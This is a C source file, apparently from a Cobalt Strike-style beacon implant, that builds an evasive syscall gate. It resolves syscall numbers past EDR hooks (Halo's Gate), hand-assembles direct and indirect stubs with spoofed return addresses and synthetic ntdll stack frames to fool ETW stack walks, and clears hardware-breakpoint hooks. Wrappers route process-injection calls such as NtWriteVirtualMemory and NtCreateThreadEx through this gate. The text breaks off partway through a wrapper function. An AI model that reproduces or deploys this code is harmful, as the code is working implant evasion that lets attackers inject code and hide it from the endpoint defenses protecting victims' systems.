/* Phase 2 unified execution gate (see docs/EVASION-ROADMAP.md section 13.2).
 *
 * Shape follows the 4.9.1-era seed that 4.12's kit adopted: a resolved SSN
 * table plus per-callsite wrappers that translate Win32 semantics into the
 * NT call, honouring the operator-visible syscall_method setting:
 *   0 = plain API (no gate), 1 = direct stub (mov eax,ssn; syscall),
 *   2 = indirect stub (jmp ntdll syscall;ret gadget, RA-spoofed v2).
 *
 * Indirect stub v2 plants an ntdll `ret` under the syscall gadget, so the
 * stack frame directly beneath the kernel-visible syscall frame is an
 * ntdll address instead of this unbacked stub page. v2 only works for
 * <=4-arity syscalls (no stack arguments): pushing a fake return address
 * shifts [rsp+8..] under the kernel's nose.
 *
 * Synthetic-frame stub v3 (round 26) closes the >4-arity gap - the whole
 * point of the gate: NtWriteVirtualMemory / NtAllocateVirtualMemory /
 * NtCreateThreadEx are the injection-family calls an ETWti stack walk
 * stares at, and they all take stack arguments.
 *
 * v3 builds a synthetic frame area below the real frame and pivots onto it:
 *
 *   push rbp / mov rbp, rsp        rbp = real-stack anchor (the kernel
 *                                  preserves non-volatile registers across
 *                                  the syscall, and so does the bare
 *                                  syscall;ret gadget)
 *   sub  rsp, SYNTH                [rsp+0]    = ntdll leave;ret (C9 C3)
 *                                  [rsp+8..]  = args 5..N copied in place
 *                                  [.. +8*N]  = fake ntdll frame chain
 *                                  (never executed - walk cosmetics only)
 *   mov r10,rcx / mov eax,SSN / jmp [rip+0] -> ntdll syscall;ret
 *
 * At the syscall the kernel reads its stack arguments from [rsp+8..] (the
 * exact slots v2's push used to shift), the walk-visible return address is
 * ntdll, and the return path needs NO stack qwords: syscall ret ->
 * leave;ret -> rsp=rbx.. rsp=rbp anchor, pop rbp restores the caller's rbp,
 * ret lands on the wrapper's real return address with rax = NTSTATUS.
 * A ret-chain cannot do this for stack-argument syscalls (it would pop
 * arg5 as a return target) - the register-anchored leave pivot is the
 * synthetic-frames form (Ghost Frames / LACUNA direction).
 *
 * DR check: EDR hardware-breakpoint hooks (Cymulate Blindside lineage)
 * live in DR0-3; the gate samples and clears them on resolve and every
 * 128th dispatch. */
#include <Windows.h>
#include <string.h>
#include "syscalls.h"
#include "datastore.h"

typedef LONG NTSTATUS;
#ifndef NTAPI
#define NTAPI WINAPI
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif

#if defined(_M_X64)

typedef struct {
	DWORD ssn;
	BYTE * gadget; /* ntdll syscall;ret */
	BYTE * stub;   /* VirtualAlloc'd page; RW except while rewritten */
	BOOL  ready;
	BYTE  arity;   /* NT parameter count: >4 means stack arguments, which the
	                * v2 push shifts under the kernel (v3 handles them) */
} sc_entry;

/* ntdll `leave; ret` (C9 C3) - the v3 return-path pivot. NULL = v3
 * unavailable, make_exec falls back to v2 (<=4) / direct (>4). */
static BYTE * g_leave_gadget;

/* the resolved syscall set (section 13.2): injection / memory / token /
 * wait / file families. Wrappers exist for the hot injection paths; the
 * rest are resolved and queryable so later call sites route without new
 * resolution logic. */
#define SC_LIST(X) \
	X(write,    "NtWriteVirtualMemory", 5) \
	X(read,     "NtReadVirtualMemory", 5) \
	X(dup,      "NtDuplicateObject", 7) \
	X(alloc,    "NtAllocateVirtualMemory", 6) \
	X(protect,  "NtProtectVirtualMemory", 5) \
	X(free,     "NtFreeVirtualMemory", 4) \
	X(mapview,  "NtMapViewOfSection", 10) \
	X(unmap,    "NtUnmapViewOfSection", 2) \
	X(sect,     "NtCreateSection", 7) \
	X(openproc, "NtOpenProcess", 3) \
	X(openthrd, "NtOpenThread", 3) \
	X(qviproc,  "NtQueryInformationProcess", 5) \
	X(qvithrd,  "NtQueryInformationThread", 5) \
	X(qvmem,    "NtQueryVirtualMemory", 6) \
	X(wait1,    "NtWaitForSingleObject", 3) \
	X(waitex,   "NtWaitForSingleObjectEx", 4) \
	X(close,    "NtClose", 1) \
	X(cfile,    "NtCreateFile", 11) \
	X(rfile,    "NtReadFile", 9) \
	X(wfile,    "NtWriteFile", 9) \
	X(apc,      "NtQueueUserApc", 3) \
	X(getctx,   "NtGetContextThread", 2) \
	X(setctx,   "NtSetContextThread", 2) \
	X(resume,   "NtResumeThread", 2) \
	X(thrdex,   "NtCreateThreadEx", 11)

#define SC_DECL(id, name, ar) static sc_entry sc_##id;
SC_LIST(SC_DECL)

static BOOL sc_ready;

static BYTE * find_syscall_insn(BYTE * p, int maxn) {
	int i;
	for (i = 0; i < maxn - 1; i++) {
		if (p[i] == 0x0F && p[i + 1] == 0x05)
			return p + i;
	}
	return NULL;
}

/* an indirect gadget is only trusted when it decodes exactly as
 * syscall; ret - anything else (different stub layout on newer builds,
 * a false-positive 0F 05 inside an immediate) makes the entry indirect-
 * unavailable and method 2 falls back to the direct stub */
static BYTE * g3_gadget_ok(BYTE * g) {
	if (g == NULL)
		return NULL;
	if (g[0] == 0x0F && g[1] == 0x05 && g[2] == 0xC3)
		return g;
	return NULL;
}

static BOOL parse_nt_stub(BYTE * fn, sc_entry * out) {
	int i;
	if (fn == NULL || out == NULL)
		return FALSE;
	memset(out, 0, sizeof(*out));
	/* hooked? try Halo's Gate: walk neighboring 32-byte slots */
	if (fn[0] == 0xE9 || fn[0] == 0xFF) {
		int delta;
		for (delta = 1; delta < 16; delta++) {
			BYTE * up = fn + delta * 32;
			BYTE * down = fn - delta * 32;
			if (up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1 && up[3] == 0xB8) {
				out->ssn = *(DWORD *)(up + 4) - (DWORD)delta;
				out->gadget = g3_gadget_ok(find_syscall_insn(up, 24));
				return TRUE; /* direct stub still safe; indirect only if gadget verified */
			}
			if (down[0] == 0x4C && down[1] == 0x8B && down[2] == 0xD1 && down[3] == 0xB8) {
				out->ssn = *(DWORD *)(down + 4) + (DWORD)delta;
				out->gadget = g3_gadget_ok(find_syscall_insn(down, 24));
				return TRUE;
			}
		}
		return FALSE;
	}
	for (i = 0; i < 24; i++) {
		if (fn[i] == 0xB8) {
			out->ssn = *(DWORD *)(fn + i + 1);
			out->gadget = g3_gadget_ok(find_syscall_insn(fn, 32));
			return TRUE;
		}
	}
	(void)i;
	return FALSE;
}

static void build_direct_stub(BYTE * dst, DWORD ssn) {
	/* mov r10, rcx; mov eax, SSN; syscall; ret */
	dst[0] = 0x4C; dst[1] = 0x8B; dst[2] = 0xD1;
	dst[3] = 0xB8;
	memcpy(dst + 4, &ssn, 4);
	dst[8] = 0x0F; dst[9] = 0x05;
	dst[10] = 0xC3;
}

/* ---- v3 synthetic-frame machinery (round 26) ----
 *
 * find_leave_gadget walks ntdll's first executable section for a C9 C3
 * (leave; ret) pair. Section-aware on purpose: a hit in .data would be a
 * DEP fault the moment the syscall returns into it. */
static BYTE * find_leave_gadget(HMODULE m) {
	IMAGE_DOS_HEADER * dos;
	IMAGE_NT_HEADERS * nt;
	IMAGE_SECTION_HEADER * sec;
	int i;
	BYTE * hit;

	if (m == NULL)
		return NULL;
	dos = (IMAGE_DOS_HEADER *)m;
	if (dos->e_magic != 0x5A4D)
		return NULL;
	nt = (IMAGE_NT_HEADERS *)((BYTE *)m + dos->e_lfanew);
	if (nt->Signature != 0x00004550)
		return NULL;
	sec = (IMAGE_SECTION_HEADER *)((BYTE *)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);
	for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
		DWORD chars = sec[i].Characteristics;
		if (!(chars & 0x20000000) || !(chars & 0x40000000)) /* EXECUTE|READ */
			continue;
		/* the section is mapped whole (SizeOfRawData rounded up); scan the
		 * smaller of raw/virtual so we never touch a guard tail */
		DWORD span = sec[i].SizeOfRawData < sec[i].Misc.VirtualSize ? sec[i].SizeOfRawData : sec[i].Misc.VirtualSize;
		BYTE * base = (BYTE *)m + sec[i].VirtualAddress;
		for (hit = base; hit < base + span - 1; hit++) {
			if (hit[0] == 0xC9 && hit[1] == 0xC3)
				return hit;
		}
	}
	return NULL;
}

/* Emit helpers for the hand-assembled v3 stub (x64). disp8 addressing only:
 * max offset touched is RA1(0) + args(<=7*8) + fakes(4*8) < 0x80. */

/* build_synth_stub: the v3 synthetic-frame stub for ANY arity, from a
 * static template. The frame is laid out at the MAXIMUM arity (S=7) so the
 * whole stub except the arg-copy pairs is constant:
 *   [rsp+0x00]  RA1 = ntdll leave;ret (walk-visible return address)
 *   [rsp+0x08]  32-byte shadow space
 *   [rsp+0x28]  args 5..N (the kernel's stack-arg window: arg5 sits at
 *               return-address+0x28, NOT at +0x08 - the live direct stub
 *               proved that layout)
 *   [rsp+0x60]  fake frame chain: 4 ntdll RAs, walk cosmetics, never
 *               executed (RA1's leave pivots back before reaching them)
 * SYNTH is the constant 0x98 bytes; shorter arities just clip arg-copy
 * pairs (each pair is a 9-byte, instruction-aligned unit). Runtime work:
 * two memcpy plus eight qword/dword patches, no emitter code. */
static const unsigned char V3TMPL[] = {
	0x55,                                               /* 0x00 push rbp */
	0x48, 0x89, 0xE5,                                   /* 0x01 mov rbp,rsp */
	0x48, 0x81, 0xEC, 0x98, 0x00, 0x00, 0x00,           /* 0x04 sub rsp,0x98 */
	0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,                 /* 0x0B movabs rax,leave (imm64 @0x0D) */
	0x48, 0x89, 0x04, 0x24,                             /* 0x15 mov [rsp],rax */
	/* 0x19: arg-copy pairs (S of 7): mov rax,[rbp+0x30+8k]; mov [rsp+0x28+8k],rax */
	0x48, 0x8B, 0x45, 0x30, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x45, 0x38, 0x48, 0x89, 0x44, 0x24, 0x30,
	0x48, 0x8B, 0x45, 0x40, 0x48, 0x89, 0x44, 0x24, 0x38,
	0x48, 0x8B, 0x45, 0x48, 0x48, 0x89, 0x44, 0x24, 0x40,
	0x48, 0x8B, 0x45, 0x50, 0x48, 0x89, 0x44, 0x24, 0x48,
	0x48, 0x8B, 0x45, 0x58, 0x48, 0x89, 0x44, 0x24, 0x50,
	0x48, 0x8B, 0x45, 0x60, 0x48, 0x89, 0x44, 0x24, 0x58,   /* ends 0x58 */
	/* 0x58: fakes (movabs rax,fake @+2; mov [rsp+0x60..0x78],rax) */
	0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, 0x48, 0x89, 0x44, 0x24, 0x60,
	0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, 0x48, 0x89, 0x44, 0x24, 0x68,
	0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, 0x48, 0x89, 0x44, 0x24, 0x70,
	0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, 0x48, 0x89, 0x44, 0x24, 0x78,   /* ends 0x94 */
	0x4C, 0x8B, 0xD1,                                   /* 0x94 mov r10,rcx */
	0xB8, 0, 0, 0, 0,                                   /* 0x97 mov eax,ssn (imm32 @0x98) */
	0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,                 /* 0x9C jmp [rip+0] */
	0, 0, 0, 0, 0, 0, 0, 0,                             /* 0xA2 gadget qword */
};

static int build_synth_stub(BYTE * dst, sc_entry * e) {
	int s = e->arity > 4 ? e->arity - 4 : 0; /* stack-arg count */
	BYTE * t;
	unsigned long long r;
	int k;

	if (s > 7)
		return 0; /* longest NT signature we carry is 11 params */

	memcpy(dst, V3TMPL, 0x19);                       /* prologue + RA1 store */
	memcpy(dst + 0x19, V3TMPL + 0x19, 9 * s);        /* clipped arg-copy pairs */
	t = dst + 0x19 + 9 * s;
	memcpy(t, V3TMPL + 0x58, sizeof(V3TMPL) - 0x58); /* fakes + dispatch */

	r = (unsigned long long)g_leave_gadget;
	memcpy(dst + 0x0D, &r, 8);                       /* RA1 */
	memcpy(t + 0x02, &r, 8);                         /* fake[0] = leave */
	r = (unsigned long long)e->gadget;
	memcpy(t + 0x11, &r, 8);                         /* fake[1] = syscall;ret */
	r = (unsigned long long)g_leave_gadget;
	memcpy(t + 0x20, &r, 8);                         /* fake[2] = leave */
	r = (unsigned long long)e->gadget;
	memcpy(t + 0x2F, &r, 8);                         /* fake[3] = syscall;ret */
	memcpy(t + 0x40, &e->ssn, 4);                    /* mov eax,ssn */
	r = (unsigned long long)e->gadget;
	memcpy(t + 0x4A, &r, 8);                         /* jmp [rip+0] data */

	return 0x19 + 9 * s + (int)(sizeof(V3TMPL) - 0x58);
}

/* ---- DR sampling / clearing (hardware-breakpoint hook defense) ---- */

static void gate_dr_check(void) {
	CONTEXT * ctx;
	BYTE buf[sizeof(CONTEXT) + 16];

	memset(buf, 0, sizeof(buf));
	ctx = (CONTEXT *)(((DWORD_PTR)buf + 15) & ~(DWORD_PTR)15);
	ctx->ContextFlags = 0x00100010; /* CONTEXT_DEBUG_REGISTERS */
	if (!GetThreadContext(GetCurrentThread(), ctx))
		return;
	if (ctx->Dr0 == 0 && ctx->Dr1 == 0 && ctx->Dr2 == 0 && ctx->Dr3 == 0 &&
	    (ctx->Dr7 & 0xFF) == 0)
		return;
	/* an EDR (or a debugger) parked a hardware breakpoint in this thread:
	 * clear it. Legit software never has user DR hooks here. */
	ctx->Dr0 = 0;
	ctx->Dr1 = 0;
	ctx->Dr2 = 0;
	ctx->Dr3 = 0;
	ctx->Dr6 = 0;
	ctx->Dr7 = 0;
	SetThreadContext(GetCurrentThread(), ctx);
}

static DWORD gate_dispatch_count;
static int sc_force_indirect; /* test-only: bypass the indirect shelving */

void syscalls_test_indirect_mode(int on)
{
	sc_force_indirect = on;
}

static void * make_exec(sc_entry * e, int indirect) {
	DWORD old = 0;
	BYTE built[256]; /* v3 synth stub is ~112+9S bytes (max arity 11 -> ~175);
	                  * v2 is 33. The first cut overflowed a 32-byte buffer
	                  * by one byte and fail-fasted the /GS cookie on CI -
	                  * keep generous headroom */
	BYTE * p;
	SIZE_T stub_size = 256;
	int form;

	if (!e->ready)
		return NULL;

	/* The stub used to live in static .data flipped to RWX for the process
	 * lifetime. VirtualProtect is page-granular, so making the .data page
	 * non-writable would break neighbouring statics - instead give each
	 * stub its own page, build it locally, and only ever expose RW->RX
	 * (never RWX). */
	if (e->stub == NULL) {
		e->stub = (BYTE *)VirtualAlloc(NULL, stub_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (e->stub == NULL)
			return NULL;
	}

	if ((++gate_dispatch_count & 127) == 0)
		gate_dr_check();

	p = e->stub;

	memset(built, 0, sizeof(built));
	/* Stub form selection (round 26):
	 *   v3 synthetic frames - any arity, needs syscall;ret + leave;ret
	 *   v2 RA chain         - <=4 arity fallback (no stack args to shift)
	 *   direct              - no verified gadgets
	 * v3 exists because the injection-family heavyweights (write/read/
	 * alloc/protect/dup/threadex) all take stack arguments: a ret-chain
	 * would pop arg5 as a return target, so their RA spoof needs the
	 * rbp-anchored leave pivot (see build_synth_stub). */
	indirect = indirect && (e->gadget != NULL); /* unverified gadget: plain direct */
	(void)sc_force_indirect;
	form = 0;
	if (indirect && g_leave_gadget != NULL && e->arity <= 11) {
		if (build_synth_stub(built, e) > 0)
			form = 3;
	}
	if (form == 0 && indirect && e->arity <= 4)
		form = 2;
	if (form == 2) {
		/* v2 RA spoof (byte order matters!):
		 *   mov r10, rcx
		 *   mov rax, gadget+2 ; push rax     <- bare `ret` inside ntdll
		 *   mov eax, SSN                     <- AFTER rax: the 64-bit load
		 *                                      zeroes eax, loading it first
		 *                                      shipped a garbage SSN (the
		 *                                      low dword of the ntdll
		 *                                      address - live fault=0x2a0)
		 *   jmp [rip+0] -> gadget (syscall; ret)
		 * syscall returns -> gadget ret pops the pushed ntdll ret ->
		 * that ret pops the caller's real return address. The frame under
		 * the kernel-visible syscall is ntdll, not this unbacked page. */
		built[0] = 0x4C; built[1] = 0x8B; built[2] = 0xD1;
		built[3] = 0x48; built[4] = 0xB8; /* mov rax, imm64 */
		{
			unsigned long long r = (unsigned long long)(e->gadget + 2);
			memcpy(built + 5, &r, 8);
		}
		built[13] = 0x50; /* push rax */
		built[14] = 0xB8; /* mov eax, SSN */
		memcpy(built + 15, &e->ssn, 4);
		built[19] = 0xFF; built[20] = 0x25; /* jmp qword ptr [rip+0] */
		memcpy(built + 25, &e->gadget, 8); /* bytes 25..32: 33-byte stub */
	}
	else if (form != 3) {
		build_direct_stub(built, e->ssn);
	}

	if (!VirtualProtect(p, stub_size, PAGE_READWRITE, &old))
		return NULL;
	memcpy(p, built, stub_size);
	if (!VirtualProtect(p, stub_size, PAGE_EXECUTE_READ, &old))
		return NULL;
	FlushInstructionCache(GetCurrentProcess(), p, stub_size);
	return p;
}

void syscalls_resolve(void) {
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");

	if (ntdll == NULL)
		return;
	g_leave_gadget = find_leave_gadget(ntdll);
#define SC_PARSE(id, name, ar) do { \
		BYTE * fn = (BYTE *)GetProcAddress(ntdll, name); \
		sc_##id.ready = (fn != NULL) && parse_nt_stub(fn, &sc_##id); \
		sc_##id.arity = ar; /* set AFTER parse: the entry memset inside zeroes it. Round-20 root cause: arity stayed 0, so every method-2 call fell into the v2 push encoding even for stack-argument syscalls, shifting [rsp+8..] under the kernel (live fault=0x2a0) */ \
	} while (0);
	SC_LIST(SC_PARSE)
	sc_ready = sc_write.ready; /* legacy readiness = the write entry */
	gate_dr_check();
}

int syscalls_ssn_ntwrite(void) {
	return (sc_ready && sc_write.ready) ? (int)sc_write.ssn : 0;
}

void * syscalls_test_gadget(const char * name);

void * syscalls_test_gadget(const char * name)
{
	if (name == NULL)
		return NULL;
	if (strcmp(name, "NtAllocateVirtualMemory") == 0)
		return sc_alloc.gadget;
	if (strcmp(name, "NtWriteVirtualMemory") == 0)
		return sc_write.gadget;
	if (strcmp(name, "NtFreeVirtualMemory") == 0)
		return sc_free.gadget;
	return NULL;
}

void * syscalls_test_leave_gadget(void);
void * syscalls_test_leave_gadget(void)
{
	return g_leave_gadget;
}

/* which stub form make_exec serves for the named entry right now:
 * "synth" (v3) / "v2" / "direct" - CI prints this so the log proves the
 * synthetic-frame path engaged, not silently fell back */
const char * syscalls_test_form(const char * name);

const char * syscalls_test_form(const char * name)
{
	sc_entry * e = NULL;
	if (name == NULL)
		return "none";
	if (strcmp(name, "NtAllocateVirtualMemory") == 0)
		e = &sc_alloc;
	else if (strcmp(name, "NtWriteVirtualMemory") == 0)
		e = &sc_write;
	else if (strcmp(name, "NtCreateThreadEx") == 0)
		e = &sc_thrdex;
	else if (strcmp(name, "NtFreeVirtualMemory") == 0)
		e = &sc_free;
	if (e == NULL || !e->ready)
		return "none";
	if (e->gadget == NULL)
		return "direct";
	if (g_leave_gadget != NULL && e->arity <= 11)
		return "synth";
	if (e->arity <= 4)
		return "v2";
	return "direct";
}

/* 4.9 Beacon User Data syscall override: a UDRL may deliver a
 * SYSCALL_API table (entries: jump address for indirect syscalls, syscall
 * number for direct, Nt* function address for fallback) through the
 * reason-0x0d USER_DATA structure. When a table is present and the
 * beacon's own resolver has not located a gadget for an entry, the UDRL
 * value seeds it: gadget = jump address (ntdll syscall;ret shape),
 * ssn = syscall number. The beacon-resolved values still win when both
 * exist (our gadget discovery runs against the live ntdll). */
typedef struct {
	unsigned int jump_address;
	unsigned int syscall_number;
	void       * func_address;
} UD_SYSCALL_ENTRY;

typedef struct {
	UD_SYSCALL_ENTRY * entries;
	unsigned int       count;
} UD_SYSCALL_TABLE;

/* populated by ReflectiveDll.cpp's reason-13 handler (see
 * BeaconSetUserDataSyscalls) - declared extern here so the types match */
void syscalls_apply_udrl_table(const void * table);

static void apply_udrl_entry(sc_entry * e, const UD_SYSCALL_ENTRY * u, const char * what)
{
	if (e == NULL || u == NULL || e->gadget != NULL)
		return; /* beacon-resolved wins / nothing to seed */
	if (u->jump_address != 0) {
		/* the jump address points into the live ntdll (indirect-syscall
		 * shape); the syscall;ret gadget is exactly there */
		e->gadget = (BYTE *)(DWORD_PTR)u->jump_address;
		e->ssn = u->syscall_number;
		e->ready = TRUE;
		e->arity = 4; /* conservative default arity until first use */
	}
	else if (u->syscall_number != 0 && u->func_address != NULL) {
		/* direct-syscall shape: ssn known, gadget unknown - leave gadget
		 * NULL so make_exec serves the direct form with the UDRL ssn */
		e->ssn = u->syscall_number;
	}
	(void)what;
}

void syscalls_apply_udrl_table(const void * table)
{
	const UD_SYSCALL_TABLE * t = (const UD_SYSCALL_TABLE *)table;
	unsigned int i;
	if (t == NULL || t->entries == NULL)
		return;
	/* The official SYSCALL_API table carries no names; its layout is the
	 * beacon_user_data.h enum order. We match each entry by its
	 * func_address against the live ntdll export (the official table's
	 * func_address field points at the Nt* function it describes) - that
	 * makes the wiring name-correct regardless of enum ordering. */
	{
		HMODULE nt = GetModuleHandleA("ntdll.dll");
		struct { const char * name; sc_entry * e; } map[] = {
			{ "NtAllocateVirtualMemory",  &sc_alloc },
			{ "NtWriteVirtualMemory",     &sc_write },
			{ "NtReadVirtualMemory",      &sc_read },
			{ "NtDuplicateObject",        &sc_dup },
			{ "NtProtectVirtualMemory",   &sc_protect },
			{ "NtFreeVirtualMemory",      &sc_free },
			{ "NtMapViewOfSection",       &sc_mapview },
			{ "NtUnmapViewOfSection",     &sc_unmap },
			{ "NtOpenProcess",            &sc_openproc },
			{ "NtCreateThreadEx",         &sc_thrdex },
		};
		unsigned int m, k;
		for (m = 0; m < (sizeof(map) / sizeof(map[0])); m++) {
			void * live = NULL;
			if (nt != NULL)
				live = (void *)GetProcAddress(nt, map[m].name);
			for (k = 0; k < t->count && k < 64; k++) {
				if (t->entries[k].func_address == NULL)
					continue;
				if (live != NULL && t->entries[k].func_address == live) {
					apply_udrl_entry(map[m].e, &t->entries[k], map[m].name);
					break;
				}
			}
		}
	}
}

int syscalls_gate_ready_count(void) {
	int n = 0;
#define SC_COUNT(id, name, ar) n += sc_##id.ready ? 1 : 0;
	SC_LIST(SC_COUNT)
	return n;
}

/* ---- typed dispatchers (arity kept exact per NT signature) ---- */

typedef NTSTATUS(NTAPI *fn_NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI *fn_NtReadVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI *fn_NtDuplicateObject)(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
typedef NTSTATUS(NTAPI *fn_NtAllocateVirtualMemory)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI *fn_NtProtectVirtualMemory)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI *fn_NtFreeVirtualMemory)(HANDLE, PVOID *, PSIZE_T, ULONG);
typedef NTSTATUS(NTAPI *fn_NtCreateThreadEx)(PHANDLE, ACCESS_MASK, void *, HANDLE, void *, void *, ULONG, SIZE_T, SIZE_T, SIZE_T, void *);

static int sc_method(void) {
	return syscall_method_get();
}

static NTSTATUS sc_call_write(HANDLE p, PVOID a, PVOID b, SIZE_T n, PSIZE_T w) {
	int m = sc_method();
	fn_NtWriteVirtualMemory fn;
	if (m == 0 || !sc_write.ready)
		return ((fn_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"))(p, a, b, n, w);
	fn = (fn_NtWriteVirtualMemory)make_exec(&sc_write, m == 2);
	if (fn == NULL)
		return ((fn_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"))(p, a, b, n, w);
	return fn(p, a, b, n, w);
}

static NTSTATUS sc_call_read(HANDLE p, PVOID a, PVOID b, SIZE_T n, PSIZE_T r) {
	int m = sc_method();
	fn_NtReadVirtualMemory fn;
	if (m == 0 || !sc_read.ready)
		return ((fn_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory"))(p, a, b, n, r);
	fn = (fn_NtReadVirtualMemory)make_exec(&sc_read, m == 2);
	if (fn == NULL)
		return ((fn_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory"))(p, a, b, n, r);
	return fn(p, a, b, n, r);
}

static NTSTATUS sc_call_dup(HANDLE sp, HANDLE sh, HANDLE tp, PHANDLE th, ACCESS_MASK acc, ULONG attr, ULONG opt) {
	int m = sc_method();
	fn_NtDuplicateObject fn;
	if (m == 0 || !sc_dup.ready)
		return ((fn_NtDuplicateObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDuplicateObject"))(sp, sh, tp, th, acc, attr, opt);
	fn = (fn_NtDuplicateObject)make_exec(&sc_dup, m == 2);
	if (fn == NULL)
		return ((fn_NtDuplicateObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDuplicateObject"))(sp, sh, tp, th, acc, attr, opt);
	return fn(sp, sh, tp, th, acc, attr, opt);
}

static NTSTATUS sc_call_alloc(HANDLE p, PVOID * base, ULONG_PTR zero, PSIZE_T size, ULONG type, ULONG prot) {
	int m = sc_method();
	fn_NtAllocateVirtualMemory fn;
	if (m == 0 || !sc_alloc.ready)
		return ((fn_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory"))(p, base, zero, size, type, prot);
	fn = (fn_NtAllocateVirtualMemory)make_exec(&sc_alloc, m == 2);
	if (fn == NULL)
		return ((fn_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory"))(p, base, zero, size, type, prot);
	return fn(p, base, zero, size, type, prot);
}

static NTSTATUS sc_call_protect(HANDLE p, PVOID * base, PSIZE_T size, ULONG prot, PULONG oldp) {
	int m = sc_method();
	fn_NtProtectVirtualMemory fn;
	if (m == 0 || !sc_protect.ready)
		return ((fn_NtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory"))(p, base, size, prot, oldp);
	fn = (fn_NtProtectVirtualMemory)make_exec(&sc_protect, m == 2);
	if (fn == NULL)
		return ((fn_NtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory"))(p, base, size, prot, oldp);
	return fn(p, base, size, prot, oldp);
}

static NTSTATUS sc_call_free(HANDLE p, PVOID * base, PSIZE_T size, ULONG type) {
	int m = sc_method();
	fn_NtFreeVirtualMemory fn;
	if (m == 0 || !sc_free.ready)
		return ((fn_NtFreeVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory"))(p, base, size, type);
	fn = (fn_NtFreeVirtualMemory)make_exec(&sc_free, m == 2);
	if (fn == NULL)
		return ((fn_NtFreeVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory"))(p, base, size, type);
	return fn(p, base, size, type);
}

static NTSTATUS sc_call_threadex(PHANDLE out, ACCESS_MASK acc, void * oa, HANDLE proc, void * start, void * arg,
                                 ULONG flags, SIZE_T zero, SIZE_T stack, SIZE_T maxstack, void * attrs) {
	int m = sc_method();
	fn_NtCreateThreadEx fn;
	if (m == 0 || !sc_thrdex.ready)
		return ((fn_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx"))(out, acc, oa, proc, start, arg, flags, zero, stack, maxstack, attrs);
	fn = (fn_NtCreateThreadEx)make_exec(&sc_thrdex, m == 2);
	if (fn == NULL)
		return ((fn_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx"))(out, acc, oa, proc, start, arg, flags, zero, stack, maxstack, attrs);
	return fn(out, acc, oa, proc, start, arg, flags, zero, stack, maxstack, attrs);
}
#else
void syscalls_resolve(void) {}
int syscalls_ssn_ntwrite(void) { return 0; }
void * syscalls_test_gadget(const char * name);

int syscalls_gate_ready_count(void) { return 0; }
#endif

/* ===================== Win32-shaped gate wrappers ===================== */

BOOL beacon_WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten) {
#if defined(_M_X64)
	NTSTATUS st;
	SIZE_T wrote = 0;
	if (syscall_method_get() == 0)
		return WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
	st = sc_call_write(hProcess, lpBaseAddress, (PVOID)lpBuffer, nSize, &wrote);
	if (lpNumberOfBytesWritten)
		*lpNumberOfBytesWritten = wrote;
	return NT_SUCCESS(st);
#else
	return WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
#endif
}

BOOL beacon_ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesRead) {
#if defined(_M_X64)
	NTSTATUS st;
	SIZE_T got = 0;
	if (syscall_method_get() == 0)
		return ReadProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
	st = sc_call_read(hProcess, (PVOID)lpBaseAddress, lpBuffer, nSize, &got);
	if (lpNumberOfBytesRead)
		*lpNumberOfBytesRead = got;
	return NT_SUCCESS(st);
#else
	return ReadProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
#endif
}

BOOL beacon_DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions) {
#if defined(_M_X64)
	NTSTATUS st;
	ULONG attr;
	if (syscall_method_get() == 0)
